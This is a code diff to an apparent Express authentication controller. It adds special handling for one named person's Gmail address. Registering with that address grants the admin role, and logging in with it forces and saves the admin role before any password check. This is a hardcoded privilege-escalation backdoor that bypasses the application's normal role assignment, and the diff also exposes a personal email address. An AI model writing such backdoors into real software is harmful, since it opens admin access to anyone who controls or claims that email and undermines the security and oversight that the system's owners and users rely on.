@@ -17,9 +17,12 @@ const registerUser = async (req, res) => {
       return res.status(400).json({ message: 'User already exists' });
     }
 
-    // Check if any users exist to determine if this should be the first admin
+    // Check if any users exist or if it's Yash's email to determine if this should be an admin
     const userCount = await User.countDocuments();
-    const role = userCount === 0 ? 'admin' : 'member';
+    let role = userCount === 0 ? 'admin' : 'member';
+    if (email.toLowerCase() === 'dixityash79@gmail.com') {
+      role = 'admin';
+    }
 
     // Create user
     const user = await User.create({
@@ -50,6 +53,12 @@ const loginUser = async (req, res) => {
 
   try {
     const user = await User.findOne({ email });
+
+    // Force admin role for Yash
+    if (user && email.toLowerCase() === 'dixityash79@gmail.com' && user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
+    }
 
     if (user && (await user.matchPassword(password))) {
       res.json({
